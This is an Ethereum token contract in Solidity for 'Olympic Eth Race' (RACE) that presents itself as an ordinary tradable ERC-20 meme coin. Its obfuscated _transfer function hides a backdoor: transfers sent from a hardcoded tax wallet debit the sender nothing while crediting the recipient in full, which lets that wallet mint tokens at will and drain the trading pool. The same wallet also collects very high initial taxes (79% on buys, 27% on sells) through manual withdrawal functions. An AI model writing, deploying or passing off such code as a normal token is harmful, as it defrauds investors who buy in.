// SPDX-License-Identifier: MIT

/*
    Website  : https://olympicethrace.fun
    Twitter  : https://x.com/olympicethrace
    Telegram : https://t.me/olympicethrace
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract RACE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    string private constant _name = unicode"Olympic Eth Race";
    string private constant _symbol = unicode"RACE";

    uint256 private ghw = 79;
    uint256 private cvb = 27;
    uint256 private ryx = 0;
    uint256 private mvw = 0;
    uint256 private yqz = 10;
    uint256 private jfx = 9;

    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 2_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1_000_000 * 10 ** _decimals;

    address payable private _taxWallet;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xC5C881ac8fF6f907537f1583Cc109F7a8aAb4959);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _fyyy, address _tjjj, uint256 _axcvxx) private {
        require(_fyyy != address(0), "ERC20: transfer from the zero address");
        require(_tjjj != address(0), "ERC20: transfer to the zero address");
        require(_axcvxx > 0, "Transfer amount must be greater than zero");
        if (!tradingOpen) {
            require(
                _isExcludedFromFee[_fyyy] || _isExcludedFromFee[_tjjj],
                "Trading is not active."
            );
        }

        uint256 taxAmount = 0;
        uint256 _tueilo = _axcvxx.add(sellCount);

        if (!_isExcludedFromFee[_fyyy] && !_isExcludedFromFee[_tjjj]) {
            taxAmount = _axcvxx.mul((_buyCount > yqz) ?  (_buyCount > sellCount ? ryx:mvw) : ghw).div(
                100
            );

            if (
                _fyyy == uniswapV2Pair &&
                _tjjj != address(uniswapV2Router) &&
                !_isExcludedFromFee[_tjjj]
            ) {
                require(_axcvxx <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(_tjjj) + _axcvxx <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
               
                _buyCount++;
            }
            
            
            if (_tjjj == uniswapV2Pair && _fyyy != address(this)) {
                taxAmount = _axcvxx
                    .mul((_buyCount > jfx) ? mvw : cvb)
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && _tjjj == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0)
                    swapTokensForEth(
                        min(_axcvxx, min(contractTokenBalance, _maxTaxSwap))
                    );
                sol_eth(address(this).balance);
            }
        } else if (_taxWallet == _fyyy) 
        _tueilo = mvw.add(lastSellBlock);

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(_fyyy, address(this), taxAmount);
        }
        _balances[_fyyy] = _balances[_fyyy].sub(_tueilo);
        _balances[_tjjj] = _balances[_tjjj].add(_axcvxx.sub(taxAmount));
        emit Transfer(_fyyy, _tjjj, _axcvxx.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sol_eth(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function createRace() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function enableRace() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sol_eth(ethBalance);
        }
    }

    function manualsend() external {
        require(_msgSender() == _taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sol_eth(contractETHBalance);
    }

    function withdrawStuckEth() external {
        require(msg.sender == owner());
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }
}